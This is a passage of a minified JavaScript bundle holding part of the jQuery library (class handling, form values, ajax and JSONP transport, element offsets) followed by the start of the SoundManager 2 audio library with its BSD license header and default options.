            return "boolean" == typeof b && "string" === c ? b ? this.addClass(a) : this.removeClass(a) : this.each(n.isFunction(a) ? function(c) {
                n(this).toggleClass(a.call(this, c, this.className, b), b)
            } : function() {
                if ("string" === c) {
                    var b, d = 0,
                        e = n(this),
                        f = a.match(E) || [];
                    while (b = f[d++]) e.hasClass(b) ? e.removeClass(b) : e.addClass(b)
                } else(c === U || "boolean" === c) && (this.className && L.set(this, "__className__", this.className), this.className = this.className || a === !1 ? "" : L.get(this, "__className__") || "")
            })
        },
        hasClass: function(a) {
            for (var b = " " + a + " ", c = 0, d = this.length; d > c; c++)
                if (1 === this[c].nodeType && (" " + this[c].className + " ").replace(ab, " ").indexOf(b) >= 0) return !0;
            return !1
        }
    });
    var bb = /\r/g;
    n.fn.extend({
        val: function(a) {
            var b, c, d, e = this[0]; {
                if (arguments.length) return d = n.isFunction(a), this.each(function(c) {
                    var e;
                    1 === this.nodeType && (e = d ? a.call(this, c, n(this).val()) : a, null == e ? e = "" : "number" == typeof e ? e += "" : n.isArray(e) && (e = n.map(e, function(a) {
                        return null == a ? "" : a + ""
                    })), b = n.valHooks[this.type] || n.valHooks[this.nodeName.toLowerCase()], b && "set" in b && void 0 !== b.set(this, e, "value") || (this.value = e))
                });
                if (e) return b = n.valHooks[e.type] || n.valHooks[e.nodeName.toLowerCase()], b && "get" in b && void 0 !== (c = b.get(e, "value")) ? c : (c = e.value, "string" == typeof c ? c.replace(bb, "") : null == c ? "" : c)
            }
        }
    }), n.extend({
        valHooks: {
            option: {
                get: function(a) {
                    var b = n.find.attr(a, "value");
                    return null != b ? b : n.trim(n.text(a))
                }
            },
            select: {
                get: function(a) {
                    for (var b, c, d = a.options, e = a.selectedIndex, f = "select-one" === a.type || 0 > e, g = f ? null : [], h = f ? e + 1 : d.length, i = 0 > e ? h : f ? e : 0; h > i; i++)
                        if (c = d[i], !(!c.selected && i !== e || (k.optDisabled ? c.disabled : null !== c.getAttribute("disabled")) || c.parentNode.disabled && n.nodeName(c.parentNode, "optgroup"))) {
                            if (b = n(c).val(), f) return b;
                            g.push(b)
                        }
                    return g
                },
                set: function(a, b) {
                    var c, d, e = a.options,
                        f = n.makeArray(b),
                        g = e.length;
                    while (g--) d = e[g], (d.selected = n.inArray(d.value, f) >= 0) && (c = !0);
                    return c || (a.selectedIndex = -1), f
                }
            }
        }
    }), n.each(["radio", "checkbox"], function() {
        n.valHooks[this] = {
            set: function(a, b) {
                return n.isArray(b) ? a.checked = n.inArray(n(a).val(), b) >= 0 : void 0
            }
        }, k.checkOn || (n.valHooks[this].get = function(a) {
            return null === a.getAttribute("value") ? "on" : a.value
        })
    }), n.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "), function(a, b) {
        n.fn[b] = function(a, c) {
            return arguments.length > 0 ? this.on(b, null, a, c) : this.trigger(b)
        }
    }), n.fn.extend({
        hover: function(a, b) {
            return this.mouseenter(a).mouseleave(b || a)
        },
        bind: function(a, b, c) {
            return this.on(a, null, b, c)
        },
        unbind: function(a, b) {
            return this.off(a, null, b)
        },
        delegate: function(a, b, c, d) {
            return this.on(b, a, c, d)
        },
        undelegate: function(a, b, c) {
            return 1 === arguments.length ? this.off(a, "**") : this.off(b, a || "**", c)
        }
    });
    var cb = n.now(),
        db = /\?/;
    n.parseJSON = function(a) {
        return JSON.parse(a + "")
    }, n.parseXML = function(a) {
        var b, c;
        if (!a || "string" != typeof a) return null;
        try {
            c = new DOMParser, b = c.parseFromString(a, "text/xml")
        } catch (d) {
            b = void 0
        }
        return (!b || b.getElementsByTagName("parsererror").length) && n.error("Invalid XML: " + a), b
    };
    var eb = /#.*$/,
        fb = /([?&])_=[^&]*/,
        gb = /^(.*?):[ \t]*([^\r\n]*)$/gm,
        hb = /^(?:about|app|app-storage|.+-extension|file|res|widget):$/,
        ib = /^(?:GET|HEAD)$/,
        jb = /^\/\//,
        kb = /^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/,
        lb = {},
        mb = {},
        nb = "*/".concat("*"),
        ob = a.location.href,
        pb = kb.exec(ob.toLowerCase()) || [];

    function qb(a) {
        return function(b, c) {
            "string" != typeof b && (c = b, b = "*");
            var d, e = 0,
                f = b.toLowerCase().match(E) || [];
            if (n.isFunction(c))
                while (d = f[e++]) "+" === d[0] ? (d = d.slice(1) || "*", (a[d] = a[d] || []).unshift(c)) : (a[d] = a[d] || []).push(c)
        }
    }

    function rb(a, b, c, d) {
        var e = {},
            f = a === mb;

        function g(h) {
            var i;
            return e[h] = !0, n.each(a[h] || [], function(a, h) {
                var j = h(b, c, d);
                return "string" != typeof j || f || e[j] ? f ? !(i = j) : void 0 : (b.dataTypes.unshift(j), g(j), !1)
            }), i
        }
        return g(b.dataTypes[0]) || !e["*"] && g("*")
    }

    function sb(a, b) {
        var c, d, e = n.ajaxSettings.flatOptions || {};
        for (c in b) void 0 !== b[c] && ((e[c] ? a : d || (d = {}))[c] = b[c]);
        return d && n.extend(!0, a, d), a
    }

    function tb(a, b, c) {
        var d, e, f, g, h = a.contents,
            i = a.dataTypes;
        while ("*" === i[0]) i.shift(), void 0 === d && (d = a.mimeType || b.getResponseHeader("Content-Type"));
        if (d)
            for (e in h)
                if (h[e] && h[e].test(d)) {
                    i.unshift(e);
                    break
                }
        if (i[0] in c) f = i[0];
        else {
            for (e in c) {
                if (!i[0] || a.converters[e + " " + i[0]]) {
                    f = e;
                    break
                }
                g || (g = e)
            }
            f = f || g
        }
        return f ? (f !== i[0] && i.unshift(f), c[f]) : void 0
    }

    function ub(a, b, c, d) {
        var e, f, g, h, i, j = {},
            k = a.dataTypes.slice();
        if (k[1])
            for (g in a.converters) j[g.toLowerCase()] = a.converters[g];
        f = k.shift();
        while (f)
            if (a.responseFields[f] && (c[a.responseFields[f]] = b), !i && d && a.dataFilter && (b = a.dataFilter(b, a.dataType)), i = f, f = k.shift())
                if ("*" === f) f = i;
                else if ("*" !== i && i !== f) {
                    if (g = j[i + " " + f] || j["* " + f], !g)
                        for (e in j)
                            if (h = e.split(" "), h[1] === f && (g = j[i + " " + h[0]] || j["* " + h[0]])) {
                                g === !0 ? g = j[e] : j[e] !== !0 && (f = h[0], k.unshift(h[1]));
                                break
                            }
                    if (g !== !0)
                        if (g && a["throws"]) b = g(b);
                        else try {
                            b = g(b)
                        } catch (l) {
                            return {
                                state: "parsererror",
                                error: g ? l : "No conversion from " + i + " to " + f
                            }
                        }
                }
        return {
            state: "success",
            data: b
        }
    }
    n.extend({
        active: 0,
        lastModified: {},
        etag: {},
        ajaxSettings: {
            url: ob,
            type: "GET",
            isLocal: hb.test(pb[1]),
            global: !0,
            processData: !0,
            async: !0,
            contentType: "application/x-www-form-urlencoded; charset=UTF-8",
            accepts: {
                "*": nb,
                text: "text/plain",
                html: "text/html",
                xml: "application/xml, text/xml",
                json: "application/json, text/javascript"
            },
            contents: {
                xml: /xml/,
                html: /html/,
                json: /json/
            },
            responseFields: {
                xml: "responseXML",
                text: "responseText",
                json: "responseJSON"
            },
            converters: {
                "* text": String,
                "text html": !0,
                "text json": n.parseJSON,
                "text xml": n.parseXML
            },
            flatOptions: {
                url: !0,
                context: !0
            }
        },
        ajaxSetup: function(a, b) {
            return b ? sb(sb(a, n.ajaxSettings), b) : sb(n.ajaxSettings, a)
        },
        ajaxPrefilter: qb(lb),
        ajaxTransport: qb(mb),
        ajax: function(a, b) {
            "object" == typeof a && (b = a, a = void 0), b = b || {};
            var c, d, e, f, g, h, i, j, k = n.ajaxSetup({}, b),
                l = k.context || k,
                m = k.context && (l.nodeType || l.jquery) ? n(l) : n.event,
                o = n.Deferred(),
                p = n.Callbacks("once memory"),
                q = k.statusCode || {},
                r = {},
                s = {},
                t = 0,
                u = "canceled",
                v = {
                    readyState: 0,
                    getResponseHeader: function(a) {
                        var b;
                        if (2 === t) {
                            if (!f) {
                                f = {};
                                while (b = gb.exec(e)) f[b[1].toLowerCase()] = b[2]
                            }
                            b = f[a.toLowerCase()]
                        }
                        return null == b ? null : b
                    },
                    getAllResponseHeaders: function() {
                        return 2 === t ? e : null
                    },
                    setRequestHeader: function(a, b) {
                        var c = a.toLowerCase();
                        return t || (a = s[c] = s[c] || a, r[a] = b), this
                    },
                    overrideMimeType: function(a) {
                        return t || (k.mimeType = a), this
                    },
                    statusCode: function(a) {
                        var b;
                        if (a)
                            if (2 > t)
                                for (b in a) q[b] = [q[b], a[b]];
                            else v.always(a[v.status]);
                        return this
                    },
                    abort: function(a) {
                        var b = a || u;
                        return c && c.abort(b), x(0, b), this
                    }
                };
            if (o.promise(v).complete = p.add, v.success = v.done, v.error = v.fail, k.url = ((a || k.url || ob) + "").replace(eb, "").replace(jb, pb[1] + "//"), k.type = b.method || b.type || k.method || k.type, k.dataTypes = n.trim(k.dataType || "*").toLowerCase().match(E) || [""], null == k.crossDomain && (h = kb.exec(k.url.toLowerCase()), k.crossDomain = !(!h || h[1] === pb[1] && h[2] === pb[2] && (h[3] || ("http:" === h[1] ? "80" : "443")) === (pb[3] || ("http:" === pb[1] ? "80" : "443")))), k.data && k.processData && "string" != typeof k.data && (k.data = n.param(k.data, k.traditional)), rb(lb, k, b, v), 2 === t) return v;
            i = n.event && k.global, i && 0 === n.active++ && n.event.trigger("ajaxStart"), k.type = k.type.toUpperCase(), k.hasContent = !ib.test(k.type), d = k.url, k.hasContent || (k.data && (d = k.url += (db.test(d) ? "&" : "?") + k.data, delete k.data), k.cache === !1 && (k.url = fb.test(d) ? d.replace(fb, "$1_=" + cb++) : d + (db.test(d) ? "&" : "?") + "_=" + cb++)), k.ifModified && (n.lastModified[d] && v.setRequestHeader("If-Modified-Since", n.lastModified[d]), n.etag[d] && v.setRequestHeader("If-None-Match", n.etag[d])), (k.data && k.hasContent && k.contentType !== !1 || b.contentType) && v.setRequestHeader("Content-Type", k.contentType), v.setRequestHeader("Accept", k.dataTypes[0] && k.accepts[k.dataTypes[0]] ? k.accepts[k.dataTypes[0]] + ("*" !== k.dataTypes[0] ? ", " + nb + "; q=0.01" : "") : k.accepts["*"]);
            for (j in k.headers) v.setRequestHeader(j, k.headers[j]);
            if (k.beforeSend && (k.beforeSend.call(l, v, k) === !1 || 2 === t)) return v.abort();
            u = "abort";
            for (j in {
                success: 1,
                error: 1,
                complete: 1
            }) v[j](k[j]);
            if (c = rb(mb, k, b, v)) {
                v.readyState = 1, i && m.trigger("ajaxSend", [v, k]), k.async && k.timeout > 0 && (g = setTimeout(function() {
                    v.abort("timeout")
                }, k.timeout));
                try {
                    t = 1, c.send(r, x)
                } catch (w) {
                    if (!(2 > t)) throw w;
                    x(-1, w)
                }
            } else x(-1, "No Transport");

            function x(a, b, f, h) {
                var j, r, s, u, w, x = b;
                2 !== t && (t = 2, g && clearTimeout(g), c = void 0, e = h || "", v.readyState = a > 0 ? 4 : 0, j = a >= 200 && 300 > a || 304 === a, f && (u = tb(k, v, f)), u = ub(k, u, v, j), j ? (k.ifModified && (w = v.getResponseHeader("Last-Modified"), w && (n.lastModified[d] = w), w = v.getResponseHeader("etag"), w && (n.etag[d] = w)), 204 === a || "HEAD" === k.type ? x = "nocontent" : 304 === a ? x = "notmodified" : (x = u.state, r = u.data, s = u.error, j = !s)) : (s = x, (a || !x) && (x = "error", 0 > a && (a = 0))), v.status = a, v.statusText = (b || x) + "", j ? o.resolveWith(l, [r, x, v]) : o.rejectWith(l, [v, x, s]), v.statusCode(q), q = void 0, i && m.trigger(j ? "ajaxSuccess" : "ajaxError", [v, k, j ? r : s]), p.fireWith(l, [v, x]), i && (m.trigger("ajaxComplete", [v, k]), --n.active || n.event.trigger("ajaxStop")))
            }
            return v
        },
        getJSON: function(a, b, c) {
            return n.get(a, b, c, "json")
        },
        getScript: function(a, b) {
            return n.get(a, void 0, b, "script")
        }
    }), n.each(["get", "post"], function(a, b) {
        n[b] = function(a, c, d, e) {
            return n.isFunction(c) && (e = e || d, d = c, c = void 0), n.ajax({
                url: a,
                type: b,
                dataType: e,
                data: c,
                success: d
            })
        }
    }), n._evalUrl = function(a) {
        return n.ajax({
            url: a,
            type: "GET",
            dataType: "script",
            async: !1,
            global: !1,
            "throws": !0
        })
    }, n.fn.extend({
        wrapAll: function(a) {
            var b;
            return n.isFunction(a) ? this.each(function(b) {
                n(this).wrapAll(a.call(this, b))
            }) : (this[0] && (b = n(a, this[0].ownerDocument).eq(0).clone(!0), this[0].parentNode && b.insertBefore(this[0]), b.map(function() {
                var a = this;
                while (a.firstElementChild) a = a.firstElementChild;
                return a
            }).append(this)), this)
        },
        wrapInner: function(a) {
            return this.each(n.isFunction(a) ? function(b) {
                n(this).wrapInner(a.call(this, b))
            } : function() {
                var b = n(this),
                    c = b.contents();
                c.length ? c.wrapAll(a) : b.append(a)
            })
        },
        wrap: function(a) {
            var b = n.isFunction(a);
            return this.each(function(c) {
                n(this).wrapAll(b ? a.call(this, c) : a)
            })
        },
        unwrap: function() {
            return this.parent().each(function() {
                n.nodeName(this, "body") || n(this).replaceWith(this.childNodes)
            }).end()
        }
    }), n.expr.filters.hidden = function(a) {
        return a.offsetWidth <= 0 && a.offsetHeight <= 0
    }, n.expr.filters.visible = function(a) {
        return !n.expr.filters.hidden(a)
    };
    var vb = /%20/g,
        wb = /\[\]$/,
        xb = /\r?\n/g,
        yb = /^(?:submit|button|image|reset|file)$/i,
        zb = /^(?:input|select|textarea|keygen)/i;

    function Ab(a, b, c, d) {
        var e;
        if (n.isArray(b)) n.each(b, function(b, e) {
            c || wb.test(a) ? d(a, e) : Ab(a + "[" + ("object" == typeof e ? b : "") + "]", e, c, d)
        });
        else if (c || "object" !== n.type(b)) d(a, b);
        else
            for (e in b) Ab(a + "[" + e + "]", b[e], c, d)
    }
    n.param = function(a, b) {
        var c, d = [],
            e = function(a, b) {
                b = n.isFunction(b) ? b() : null == b ? "" : b, d[d.length] = encodeURIComponent(a) + "=" + encodeURIComponent(b)
            };
        if (void 0 === b && (b = n.ajaxSettings && n.ajaxSettings.traditional), n.isArray(a) || a.jquery && !n.isPlainObject(a)) n.each(a, function() {
            e(this.name, this.value)
        });
        else
            for (c in a) Ab(c, a[c], b, e);
        return d.join("&").replace(vb, "+")
    }, n.fn.extend({
        serialize: function() {
            return n.param(this.serializeArray())
        },
        serializeArray: function() {
            return this.map(function() {
                var a = n.prop(this, "elements");
                return a ? n.makeArray(a) : this
            }).filter(function() {
                var a = this.type;
                return this.name && !n(this).is(":disabled") && zb.test(this.nodeName) && !yb.test(a) && (this.checked || !T.test(a))
            }).map(function(a, b) {
                var c = n(this).val();
                return null == c ? null : n.isArray(c) ? n.map(c, function(a) {
                    return {
                        name: b.name,
                        value: a.replace(xb, "\r\n")
                    }
                }) : {
                    name: b.name,
                    value: c.replace(xb, "\r\n")
                }
            }).get()
        }
    }), n.ajaxSettings.xhr = function() {
        try {
            return new XMLHttpRequest
        } catch (a) {}
    };
    var Bb = 0,
        Cb = {},
        Db = {
            0: 200,
            1223: 204
        },
        Eb = n.ajaxSettings.xhr();
    a.attachEvent && a.attachEvent("onunload", function() {
        for (var a in Cb) Cb[a]()
    }), k.cors = !!Eb && "withCredentials" in Eb, k.ajax = Eb = !!Eb, n.ajaxTransport(function(a) {
        var b;
        return k.cors || Eb && !a.crossDomain ? {
            send: function(c, d) {
                var e, f = a.xhr(),
                    g = ++Bb;
                if (f.open(a.type, a.url, a.async, a.username, a.password), a.xhrFields)
                    for (e in a.xhrFields) f[e] = a.xhrFields[e];
                a.mimeType && f.overrideMimeType && f.overrideMimeType(a.mimeType), a.crossDomain || c["X-Requested-With"] || (c["X-Requested-With"] = "XMLHttpRequest");
                for (e in c) f.setRequestHeader(e, c[e]);
                b = function(a) {
                    return function() {
                        b && (delete Cb[g], b = f.onload = f.onerror = null, "abort" === a ? f.abort() : "error" === a ? d(f.status, f.statusText) : d(Db[f.status] || f.status, f.statusText, "string" == typeof f.responseText ? {
                            text: f.responseText
                        } : void 0, f.getAllResponseHeaders()))
                    }
                }, f.onload = b(), f.onerror = b("error"), b = Cb[g] = b("abort");
                try {
                    f.send(a.hasContent && a.data || null)
                } catch (h) {
                    if (b) throw h
                }
            },
            abort: function() {
                b && b()
            }
        } : void 0
    }), n.ajaxSetup({
        accepts: {
            script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
        },
        contents: {
            script: /(?:java|ecma)script/
        },
        converters: {
            "text script": function(a) {
                return n.globalEval(a), a
            }
        }
    }), n.ajaxPrefilter("script", function(a) {
        void 0 === a.cache && (a.cache = !1), a.crossDomain && (a.type = "GET")
    }), n.ajaxTransport("script", function(a) {
        if (a.crossDomain) {
            var b, c;
            return {
                send: function(d, e) {
                    b = n("<script>").prop({
                        async: !0,
                        charset: a.scriptCharset,
                        src: a.url
                    }).on("load error", c = function(a) {
                        b.remove(), c = null, a && e("error" === a.type ? 404 : 200, a.type)
                    }), l.head.appendChild(b[0])
                },
                abort: function() {
                    c && c()
                }
            }
        }
    });
    var Fb = [],
        Gb = /(=)\?(?=&|$)|\?\?/;
    n.ajaxSetup({
        jsonp: "callback",
        jsonpCallback: function() {
            var a = Fb.pop() || n.expando + "_" + cb++;
            return this[a] = !0, a
        }
    }), n.ajaxPrefilter("json jsonp", function(b, c, d) {
        var e, f, g, h = b.jsonp !== !1 && (Gb.test(b.url) ? "url" : "string" == typeof b.data && !(b.contentType || "").indexOf("application/x-www-form-urlencoded") && Gb.test(b.data) && "data");
        return h || "jsonp" === b.dataTypes[0] ? (e = b.jsonpCallback = n.isFunction(b.jsonpCallback) ? b.jsonpCallback() : b.jsonpCallback, h ? b[h] = b[h].replace(Gb, "$1" + e) : b.jsonp !== !1 && (b.url += (db.test(b.url) ? "&" : "?") + b.jsonp + "=" + e), b.converters["script json"] = function() {
            return g || n.error(e + " was not called"), g[0]
        }, b.dataTypes[0] = "json", f = a[e], a[e] = function() {
            g = arguments
        }, d.always(function() {
            a[e] = f, b[e] && (b.jsonpCallback = c.jsonpCallback, Fb.push(e)), g && n.isFunction(f) && f(g[0]), g = f = void 0
        }), "script") : void 0
    }), n.parseHTML = function(a, b, c) {
        if (!a || "string" != typeof a) return null;
        "boolean" == typeof b && (c = b, b = !1), b = b || l;
        var d = v.exec(a),
            e = !c && [];
        return d ? [b.createElement(d[1])] : (d = n.buildFragment([a], b, e), e && e.length && n(e).remove(), n.merge([], d.childNodes))
    };
    var Hb = n.fn.load;
    n.fn.load = function(a, b, c) {
        if ("string" != typeof a && Hb) return Hb.apply(this, arguments);
        var d, e, f, g = this,
            h = a.indexOf(" ");
        return h >= 0 && (d = n.trim(a.slice(h)), a = a.slice(0, h)), n.isFunction(b) ? (c = b, b = void 0) : b && "object" == typeof b && (e = "POST"), g.length > 0 && n.ajax({
            url: a,
            type: e,
            dataType: "html",
            data: b
        }).done(function(a) {
            f = arguments, g.html(d ? n("<div>").append(n.parseHTML(a)).find(d) : a)
        }).complete(c && function(a, b) {
                g.each(c, f || [a.responseText, b, a])
            }), this
    }, n.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function(a, b) {
        n.fn[b] = function(a) {
            return this.on(b, a)
        }
    }), n.expr.filters.animated = function(a) {
        return n.grep(n.timers, function(b) {
            return a === b.elem
        }).length
    };
    var Ib = a.document.documentElement;

    function Jb(a) {
        return n.isWindow(a) ? a : 9 === a.nodeType && a.defaultView
    }
    n.offset = {
        setOffset: function(a, b, c) {
            var d, e, f, g, h, i, j, k = n.css(a, "position"),
                l = n(a),
                m = {};
            "static" === k && (a.style.position = "relative"), h = l.offset(), f = n.css(a, "top"), i = n.css(a, "left"), j = ("absolute" === k || "fixed" === k) && (f + i).indexOf("auto") > -1, j ? (d = l.position(), g = d.top, e = d.left) : (g = parseFloat(f) || 0, e = parseFloat(i) || 0), n.isFunction(b) && (b = b.call(a, c, h)), null != b.top && (m.top = b.top - h.top + g), null != b.left && (m.left = b.left - h.left + e), "using" in b ? b.using.call(a, m) : l.css(m)
        }
    }, n.fn.extend({
        offset: function(a) {
            if (arguments.length) return void 0 === a ? this : this.each(function(b) {
                n.offset.setOffset(this, a, b)
            });
            var b, c, d = this[0],
                e = {
                    top: 0,
                    left: 0
                },
                f = d && d.ownerDocument;
            if (f) return b = f.documentElement, n.contains(b, d) ? (typeof d.getBoundingClientRect !== U && (e = d.getBoundingClientRect()), c = Jb(f), {
                top: e.top + c.pageYOffset - b.clientTop,
                left: e.left + c.pageXOffset - b.clientLeft
            }) : e
        },
        position: function() {
            if (this[0]) {
                var a, b, c = this[0],
                    d = {
                        top: 0,
                        left: 0
                    };
                return "fixed" === n.css(c, "position") ? b = c.getBoundingClientRect() : (a = this.offsetParent(), b = this.offset(), n.nodeName(a[0], "html") || (d = a.offset()), d.top += n.css(a[0], "borderTopWidth", !0), d.left += n.css(a[0], "borderLeftWidth", !0)), {
                    top: b.top - d.top - n.css(c, "marginTop", !0),
                    left: b.left - d.left - n.css(c, "marginLeft", !0)
                }
            }
        },
        offsetParent: function() {
            return this.map(function() {
                var a = this.offsetParent || Ib;
                while (a && !n.nodeName(a, "html") && "static" === n.css(a, "position")) a = a.offsetParent;
                return a || Ib
            })
        }
    }), n.each({
        scrollLeft: "pageXOffset",
        scrollTop: "pageYOffset"
    }, function(b, c) {
        var d = "pageYOffset" === c;
        n.fn[b] = function(e) {
            return J(this, function(b, e, f) {
                var g = Jb(b);
                return void 0 === f ? g ? g[c] : b[e] : void(g ? g.scrollTo(d ? a.pageXOffset : f, d ? f : a.pageYOffset) : b[e] = f)
            }, b, e, arguments.length, null)
        }
    }), n.each(["top", "left"], function(a, b) {
        n.cssHooks[b] = ya(k.pixelPosition, function(a, c) {
            return c ? (c = xa(a, b), va.test(c) ? n(a).position()[b] + "px" : c) : void 0
        })
    }), n.each({
        Height: "height",
        Width: "width"
    }, function(a, b) {
        n.each({
            padding: "inner" + a,
            content: b,
            "": "outer" + a
        }, function(c, d) {
            n.fn[d] = function(d, e) {
                var f = arguments.length && (c || "boolean" != typeof d),
                    g = c || (d === !0 || e === !0 ? "margin" : "border");
                return J(this, function(b, c, d) {
                    var e;
                    return n.isWindow(b) ? b.document.documentElement["client" + a] : 9 === b.nodeType ? (e = b.documentElement, Math.max(b.body["scroll" + a], e["scroll" + a], b.body["offset" + a], e["offset" + a], e["client" + a])) : void 0 === d ? n.css(b, c, g) : n.style(b, c, d, g)
                }, b, f ? d : void 0, f, null)
            }
        })
    }), n.fn.size = function() {
        return this.length
    }, n.fn.andSelf = n.fn.addBack, "function" == typeof define && define.amd && define("jquery", [], function() {
        return n
    });
    var Kb = a.jQuery,
        Lb = a.$;
    return n.noConflict = function(b) {
        return a.$ === n && (a.$ = Lb), b && a.jQuery === n && (a.jQuery = Kb), n
    }, typeof b === U && (a.jQuery = a.$ = n), n
});
/** @license
 *
 * SoundManager 2: JavaScript Sound for the Web
 * ----------------------------------------------
 * http://schillmania.com/projects/soundmanager2/
 *
 * Copyright (c) 2007, Scott Schiller. All rights reserved.
 * Code provided under the BSD License:
 * http://schillmania.com/projects/soundmanager2/license.txt
 *
 * V2.97a.20150601
 */
(function(h, g) {
    function w(gb, w) {
        function Z(b) {
            return c.preferFlash && A && !c.ignoreFlash && c.flash[b] !== g && c.flash[b]
        }

        function r(b) {
            return function(c) {
                var d = this._s;
                return d && d._a ? b.call(this, c) : null
            }
        }
        this.setupOptions = {
            url: gb || null,
            flashVersion: 8,
            debugMode: !0,
            debugFlash: !1,
            useConsole: !0,
            consoleOnly: !0,
            waitForWindowLoad: !1,
            bgColor: "#ffffff",
            useHighPerformance: !1,
            flashPollingInterval: null,
            html5PollingInterval: null,
            flashLoadTimeout: 1E3,
            wmode: null,
            allowScriptAccess: "always",
            useFlashBlock: !1,
            useHTML5Audio: !0,
            forceUseGlobalHTML5Audio: !1,
            ignoreMobileRestrictions: !1,
            html5Test: /^(probably|maybe)$/i,
            preferFlash: !1,
            noSWFCache: !1,
            idPrefix: "sound"
        };
        this.defaultOptions = {
            autoLoad: !1,
            autoPlay: !1,
            from: null,
            loops: 1,
            onid3: null,
            onload: null,
            whileloading: null,
            onplay: null,
            onpause: null,
            onresume: null,
            whileplaying: null,
            onposition: null,
            onstop: null,
            onfailure: null,
            onfinish: null,
            multiShot: !0,
            multiShotEvents: !1,
            position: null,
            pan: 0,
            stream: !0,
            to: null,
            type: null,
            usePolicyFile: !1,
            volume: 100
        };
        this.flash9Options = {
            isMovieStar: null,
            usePeakData: !1,
            useWaveformData: !1,
            useEQData: !1,
            onbufferchange: null,
            ondataerror: null
        };
        this.movieStarOptions = {
            bufferTime: 3,
            serverURL: null,
            onconnect: null,
            duration: null
        };
        this.audioFormats = {
            mp3: {
                type: ['audio/mpeg; codecs="mp3"', "audio/mpeg", "audio/mp3", "audio/MPA", "audio/mpa-robust"],
                required: !0
            },
            mp4: {
                related: ["aac", "m4a", "m4b"],
                type: ['audio/mp4; codecs="mp4a.40.2"', "audio/aac", "audio/x-m4a", "audio/MP4A-LATM", "audio/mpeg4-generic"],
                required: !1
            },
            ogg: {
                type: ["audio/ogg; codecs=vorbis"],
                required: !1
            },
            opus: {
                type: ["audio/ogg; codecs=opus",
                    "audio/opus"
                ],
                required: !1
            },
            wav: {
                type: ['audio/wav; codecs="1"', "audio/wav", "audio/wave", "audio/x-wav"],
                required: !1
            }
        };
        this.movieID = "sm2-container";
        this.id = w || "sm2movie";
        this.debugID = "soundmanager-debug";
        this.debugURLParam = /([#?&])debug=1/i;
        this.versionNumber = "V2.97a.20150601";
        this.altURL = this.movieURL = this.version = null;
        this.enabled = this.swfLoaded = !1;
        this.oMC = null;
        this.sounds = {};
        this.soundIDs = [];
        this.didFlashBlock = this.muted = !1;
        this.filePattern = null;
        this.filePatterns = {
            flash8: /\.mp3(\?.*)?$/i,
            flash9: /\.mp3(\?.*)?$/i
        };
        this.features = {
            buffering: !1,
            peakData: !1,
            waveformData: !1,
            eqData: !1,
            movieStar: !1
        };
        this.sandbox = {};
        this.html5 = {
            usingFlash: null
        };
        this.flash = {};
        this.ignoreFlash = this.html5Only = !1;
        var N, c = this,
            Oa = null,
            k = null,
            aa, u = navigator.userAgent,
            Pa = h.location.href.toString(),
            p = document,
            pa, Qa, qa, m, y = [],
            O = !1,
            P = !1,
            l = !1,
            B = !1,
            ra = !1,
            Q, x, sa, ba, ta, F, H, I, Ra, ua, va, ca, J, da, G, wa, R, xa, ea, K, Sa, ya, Ta, za, Ua, S = null,
            Aa = null,
            T, Ba, L, fa, ga, q, U = !1,
            Ca = !1,
            Va, Wa, Xa, ha = 0,
            V = null,
            ia, W = [],
            X, v = null,
            Ya, ja, Y, D, ka, Da, Za, t, hb = Array.prototype.slice,
            z = !1,
            Ea, A, Fa, $a, C, la, ab = 0,
            Ga, Ha = u.match(/(ipad|iphone|ipod)/i),
            Ia = u.match(/android/i),
            E = u.match(/msie/i),
            ib = u.match(/webkit/i),
            ma = u.match(/safari/i) && !u.match(/chrome/i),
            Ja = u.match(/opera/i),
            na = u.match(/(mobile|pre\/|xoom)/i) || Ha || Ia,
            bb = !Pa.match(/usehtml5audio/i) && !Pa.match(/sm2\-ignorebadua/i) && ma && !u.match(/silk/i) && u.match(/OS X 10_6_([3-7])/i),
            Ka = p.hasFocus !== g ? p.hasFocus() : null,
            oa = ma && (p.hasFocus === g || !p.hasFocus()),
            cb = !oa,
            db = /(mp3|mp4|mpa|m4a|m4b)/i,
            La = p.location ? p.location.protocol.match(/http/i) :
                null,
            jb = La ? "" : "http://",
            eb = /^\s*audio\/(?:x-)?(?:mpeg4|aac|flv|mov|mp4||m4v|m4a|m4b|mp4v|3gp|3g2)\s*(?:$|;)/i,
            fb = "mpeg4 aac flv mov mp4 m4v f4v m4a m4b mp4v 3gp 3g2".split(" "),
            kb = new RegExp("\\.(" + fb.join("|") + ")(\\?.*)?$", "i");
        this.mimePattern = /^\s*audio\/(?:x-)?(?:mp(?:eg|3))\s*(?:$|;)/i;
        this.useAltURL = !La;
        var Ma;
        try {
            Ma = Audio !== g && (Ja && opera !== g && 10 > opera.version() ? new Audio(null) : new Audio).canPlayType !== g
        } catch (lb) {
            Ma = !1
        }
        this.hasHTML5 = Ma;
        this.setup = function(b) {
            var e = !c.url;
            b !== g && l && v && c.ok();
            sa(b);
            if (!z)
                if (na) {
                    if (!c.setupOptions.ignoreMobileRestrictions || c.setupOptions.forceUseGlobalHTML5Audio) W.push(J.globalHTML5), z = !0
                } else c.setupOptions.forceUseGlobalHTML5Audio && (W.push(J.globalHTML5), z = !0);
            if (!Ga && na)
                if (c.setupOptions.ignoreMobileRestrictions) W.push(J.ignoreMobile);
                else if (c.setupOptions.useHTML5Audio = !0, c.setupOptions.preferFlash = !1, Ha) c.ignoreFlash = !0;
                else if (Ia && !u.match(/android\s2\.3/i) || !Ia) z = !0;
            b && (e && R && b.url !== g && c.beginDelayedInit(), R || b.url === g || "complete" !== p.readyState ||
            setTimeout(G, 1));
            Ga = !0;
            return c
        };
        this.supported = this.ok = function() {
            return v ? l && !B : c.useHTML5Audio && c.hasHTML5
        };
        this.getMovie = function(b) {
            return aa(b) || p[b] || h[b]
        };
        this.createSound = function(b, e) {
            function d() {
                a = fa(a);
                c.sounds[a.id] = new N(a);
                c.soundIDs.push(a.id);
                return c.sounds[a.id]
            }
            var a, f = null;
            if (!l || !c.ok()) return !1;
            e !== g && (b = {
                id: b,
                url: e
            });
            a = x(b);
            a.url = ia(a.url);
            a.id === g && (a.id = c.setupOptions.idPrefix + ab++);
            if (q(a.id, !0)) return c.sounds[a.id];
            if (ja(a)) f = d(), f._setup_html5(a);
            else {
